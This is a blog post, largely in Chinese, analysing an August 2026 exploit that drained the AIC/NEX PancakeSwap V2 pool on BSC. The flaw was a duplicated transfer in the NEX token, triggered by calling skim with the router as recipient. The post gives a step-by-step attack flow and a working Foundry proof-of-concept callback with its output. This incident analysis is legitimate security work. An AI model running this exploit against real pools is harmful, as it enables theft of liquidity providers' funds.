---
title: "AIC/NEX Attack Analysis"
date: 2026-08-08T10:04:27+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
---

In August 2026, at BSC block 113782392, a transaction (`0x905cc861bcc525d3a8e699583943831b97500bbac11c92dc20ed6edbddd69f87`) drained the AIC/NEX pool (`0x974C0078740480aE830D379fDB8d5f441C9dDC75`) on PancakeSwap V2: the AIC side of the pool's reserves went from approximately 83.26 million (including the portion the attacker swapped in) down to just 4589 wei, netting the attacker about 40 million AIC, which was then converted into 32.361267 BNB via a two-hop swap and sent to the originating EOA `0xc3cb0872c42bfa5eb3b0258d7eea2ccaf6a49475`.

<!--more-->

## 1. 概述

2026 年 8 月，BSC 区块 113782392，一笔交易（`0x905cc861bcc525d3a8e699583943831b97500bbac11c92dc20ed6edbddd69f87`）把 PancakeSwap V2 上的 AIC/NEX 池（`0x974C0078740480aE830D379fDB8d5f441C9dDC75`）打穿了：池子里 AIC 那一侧的储备从约 8326 万（含攻击者自己换进去的部分）被换到只剩 4589 wei，攻击者净赚约 4000 万枚 AIC，随后经两跳 swap 变现成 32.361267 BNB，转给发起交易的 EOA `0xc3cb0872c42bfa5eb3b0258d7eea2ccaf6a49475`。

整个过程只用了一笔交易，没有借用任何外部闪电贷协议，没有拿任何管理员权限，起始资本是 0。攻击合约（`0x29977d9b8a888b17bffa2958b003956a5e8be69a`）由另一个合约在自己的构造函数里 CREATE 出来，这是老套路了，不多展开。真正值得写的是两个各自看起来都不严重的问题拼在一起之后发生了什么：一个是 NEX 代币自己 `_transfer` 里的一处重复转账，另一个是 UniswapV2Pair 标准函数 `skim` 的收款地址完全由调用者指定。单独看，前者"够不到"正常用户，后者是每个 fork 出来的 DEX 都有的标准维护接口。但只要把 `skim` 的收款地址填成前者会触发 bug 的那个地址，两个问题就接上了。

AIC（`0xc0dc449de632586a00409873521afc251ac5ce74`）和 NEX（`0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9`）是同一个团队部署在 BSC 上的两枚代币，AIC 是标准 OpenZeppelin ERC20，没有自定义转账逻辑；NEX 多了一个卖出税。两枚代币各自跟 USDC 或对方组了一个 PancakeSwap V2 池：AIC/USDC 池（`0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415`）和这次被打的 AIC/NEX 池。攻击块前一块（113782391）读到的储备是：AIC/USDC 池里 44,632.406867 USDC 对 42,982,239.623682 AIC，AIC/NEX 池里 65,524,127.109281 NEX 对 40,279,208.819697 AIC。两个池子体量接近，这一点后面会用上——攻击者从 AIC/USDC 池借出的 AIC，换算成 NEX 之后跟 AIC/NEX 池自身的 NEX 储备是同一个数量级，一次换汇就够把这个池子"喂饱"。

## 2. NEX 的 `_transfer`：一处容易被读漏的重复调用

NEX 继承标准 ERC20 并重写了 `_transfer`，用来给卖出交易抽 6% 的税：

```solidity
address public uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address public uniswapV2PairAid;
mapping(address => bool) public automatedMarketMakerPairs;
uint256 public daoFee;
uint256 public nodeFee;

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");

    if(amount == 0) {
        super._transfer(from, to, 0);
        return;
    }

    bool isSell = automatedMarketMakerPairs[to];
    bool isRouter = (from == uniswapV2Router || to == uniswapV2Router);

    if (isRouter){
        super._transfer(from, to, amount);
    } else if (isSell){
        uint256 daoTokens = amount.mul(daoFee).div(100);
        uint256 nodeTokens = amount.mul(nodeFee).div(100);

        amount = amount.sub(daoTokens).sub(nodeTokens);

        if (daoTokens > 0){
            super._transfer(from, daoAddress, daoTokens);
        }
        if (nodeTokens > 0){
            super._transfer(from, nodeAddress, nodeTokens);
        }
    }

    super._transfer(from, to, amount);
}
```

`isSell` 判断的是 `to` 是不是登记过的 AMM pair（构造函数里把 AIC/NEX 池自己注册成了 `automatedMarketMakerPairs`），命中就按 `daoFee`/`nodeFee` 抽税——攻击发生时 `daoFee` 是 6、`nodeFee` 是 0，两个费率的收款地址还是同一个，所以实际只走 `daoTokens` 这一支。这部分逻辑本身没问题，因为抽完税之后 `amount` 被重新赋值成了税后余额，函数末尾那句 `super._transfer(from, to, amount)` 转的是扣完税剩下的部分，三笔转账加起来正好等于原始 `amount`，这是常见写法：先把要扣走的部分转掉，剩下的交给最后一行处理。

问题出在 `isRouter` 这个分支。`isRouter` 判断的是 `from` 或者 `to` 有没有一个是 PancakeSwap Router 地址（`0x10ED43C718714eb63d5aA57B78B54704E256024E`）。命中之后，`if` 块里先执行了一次 `super._transfer(from, to, amount)`，但这里没有对 `amount` 做任何调整，也没有 `return`，也没有包一层 `else`。函数走到末尾，那句无条件的 `super._transfer(from, to, amount)` 会再执行一次，用的还是同一个、没被改过的 `amount`。也就是说，只要 `from == router` 或者 `to == router`，这一次 `_transfer` 调用会把 `amount` 从 `from` 移到 `to` **两次**。

这个 bug 单独看不容易触发。正常用户经 Router 买卖代币时，Router 从来不会自己持有中间币种——PancakeSwap V2 Router 的 swap 函数内部走的都是 `token.transferFrom(msg.sender, pairAddress, amount)` 或者 `pair.swap(...)` 直接把 out token 发到用户地址，Router 合约自己不会作为 `from` 或 `to` 出现在 NEX 的转账里。这也是为什么这段代码能在链上正常运行很久都没被注意到。

## 3. `skim`：收款地址是调用者说了算

UniswapV2Pair（PancakeSwap V2 沿用了同一套实现）有一个标准维护函数：

```solidity
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
}
```

`reserve0`/`reserve1` 是缓存的储备值，只在 `swap`/`mint`/`burn`/`sync` 时更新；`balanceOf(address(this))` 是这一刻的真实余额。两者之差如果大于 0，说明有代币是直接转进池子的（没走 swap），`skim` 把这部分"多出来的"转给调用者指定的 `to`。这个函数**没有任何权限修饰符**，任何人都能调，`to` 也完全由调用者自己填——它原本是给"不小心转错代币进池子"的用户提供的一个自救接口。

对 AIC/NEX 池而言，token0 是 NEX。如果有人直接往这个池子 `transfer()` 一笔 NEX（不经过 `swap`），池子的真实 NEX 余额会立刻高出缓存的 `reserve0`，谁都能调用 `skim` 把这部分差额取走。

## 4. 接缝：把 `skim` 的收款地址填成 Router

单独看，`isRouter` 双转账"够不到"正常调用路径，`skim` 的自由收款地址是标准设计。把两者接起来只需要一步：调用 `pair.skim(routerAddress)`。

`skim` 内部发起的调用是 `NEX.transfer(routerAddress, excess)`——这正好满足 NEX `_transfer` 里 `to == uniswapV2Router` 的条件。`isRouter` 分支被激活：先转一次 `excess`，函数末尾又无条件转一次同样的 `excess`。这一次 `skim` 调用，实际从池子里搬走的不是 `excess`，而是 `2 × excess`。

链上这笔交易里能直接看到这个效果：`skim` 内部那一次 `NEX.transfer` 触发了**两条完全相同的 `Transfer` 事件**（同样的 `from`、`to`、金额），这就是双转账 bug 被触发的直接证据。捐进池子的每一块钱，一次 `skim` 就能连本带利拿走两倍——池子的 NEX 储备被打穿的速度，比"裸" donate+skim 快了一倍。

## 5. 完整攻击流程

攻击合约的资本来源是 AIC/USDC 池自带的 flash-swap：调用 `pair.swap(amount0Out, amount1Out, to, data)` 时如果 `data` 非空，pair 会先把代币转给 `to`，再回调 `to.pancakeCall(sender, amount0, amount1, data)`，只要在回调结束前把借出的代币还回去（加 0.25% 费），中间这段时间借来的钱可以随便用。这是 PancakeSwap 内置的能力，不需要 Aave、Balancer 这类外部闪电贷协议。

1. 对 AIC/USDC 池发起 flash-swap，借出该池几乎全部的 AIC 储备（42,982,239.623682 AIC，留 1 wei）。
2. 在回调里把借来的 AIC 经 Router 换成 NEX（走 AIC/NEX 池），拿到 33,784,701.156467 NEX。这一次 swap 本身也会把 AIC/NEX 池的储备同步成 swap 后的真实值：NEX 那一侧降到 31,739,425.952814，AIC 那一侧升到 83,261,448.443378。
3. 把刚拿到的 NEX 里的大部分（33,765,346.758312）直接 `transfer()` 给 AIC/NEX 池——不走 swap，就是纯粹的转账。因为目标地址是登记过的 AMM pair，NEX 的 6% 卖出税会先扣走 2,025,920.805499 打给 `daoAddress`（`0x0f7e35653f6A8E09A0865a183B51177e16237CB5`），净额 31,739,425.952814 落进池子。此时池子的真实 NEX 余额变成 63,478,851.905627，比缓存的 reserve0 高出正好这笔净额。
4. 调用 `pair.skim(PancakeRouter地址)`。`skim` 算出的"超额"是 31,739,425.952814，本该转这么多，但因为收款地址是 Router，NEX 的 `_transfer` 把这笔转账执行了两次，池子的 NEX 余额被扣掉 63,478,851.905627——几乎是这一刻全部的真实余额。
5. 调用 `pair.sync()`，把缓存的 `reserve0` 同步成崩溃后的真实余额（这笔交易里同步到了 1）。
6. 用手上剩下的一点 NEX（18,193,134.265378）经 Router 换回 AIC。此时 AIC/NEX 池的恒定乘积公式里 `reserveIn`（NEX 那一侧）已经接近 0，`amountOut = reserveOut * amountIn * 997 / (reserveIn * 1000 + amountIn * 997)` 在 `reserveIn≈0` 时约等于 `reserveOut`——这笔小额 swap 换出了池子里几乎全部的 AIC 储备：83,261,448.443378。
7. 拿这笔 AIC 里的 43,089,964.535019 归还第 1 步的 flash-swap（本金 + 0.25% 费）。
8. 剩下的约 4017 万 AIC，经 AIC/USDC 池换成 USDC，再经另一个 USDC/WBNB 池（`0xd99c7f6c65857ac913a8f880a4cb84032ab2fc5b`）换成 WBNB，解包成 BNB，转给发起交易的 EOA：32.361267 BNB。

攻击结束后，AIC/NEX 池的状态是 NEX 储备约 1819 万、AIC 储备只剩 4589 wei——这个池子事实上已经报废，池子里剩下的 LP 份额对应不到任何有意义的 AIC。

## 6. 复现

用 Foundry fork 到攻击块前一块（113782391）复现这条路径，攻击合约从 0 个 AIC、0 个 NEX、0 个 USDC 出发，不冒充任何特权地址，借款、捐赠、还款的金额都在交易执行时用链上真实状态现算：

```solidity
function pancakeCall(address /*sender*/, uint256 /*amount0*/, uint256 amount1, bytes calldata data) external {
    require(msg.sender == address(PAIR_AIC_USDC), "callback: bad caller");
    uint256 aicBorrowed = amount1;

    AIC.approve(address(ROUTER), aicBorrowed);
    address[] memory pathToNex = new address[](2);
    pathToNex[0] = address(AIC);
    pathToNex[1] = address(NEX);
    ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(aicBorrowed, 0, pathToNex, address(this), block.timestamp);

    uint256 nexHeld = NEX.balanceOf(address(this));
    uint256 poolNexBefore = NEX.balanceOf(address(PAIR_AIC_NEX));

    uint256 targetNet = (poolNexBefore * 99999) / 100000;
    uint256 grossDonation = (targetNet * 100) / 94 + 1; // 倒推税前总额，NEX 卖出税 6%
    NEX.transfer(address(PAIR_AIC_NEX), grossDonation);

    PAIR_AIC_NEX.skim(address(ROUTER)); // 收款地址填 Router，命中 isRouter 双转账
    PAIR_AIC_NEX.sync();

    uint256 nexRemaining = NEX.balanceOf(address(this));
    NEX.approve(address(ROUTER), nexRemaining);
    address[] memory pathToAic = new address[](2);
    pathToAic[0] = address(NEX);
    pathToAic[1] = address(AIC);
    ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(nexRemaining, 0, pathToAic, address(this), block.timestamp);

    uint256 repayAmount = (aicBorrowed * 10000) / 9975 + 1;
    AIC.transfer(address(PAIR_AIC_USDC), repayAmount);
}
```

跑出来的结果：

```
AIC/NEX pool AIC before: 40,279,208.819697
AIC/NEX pool AIC after :  1,407,049.473954   （96.5% 被抽干）
attacker AIC profit    : 38,764,434.434405   （零起始资本、零权限）
```

数字跟真实攻击（约 4000 万 AIC）对得上，差异来自捐赠比例这个安全边际参数取值不同，不是机制上的差别。

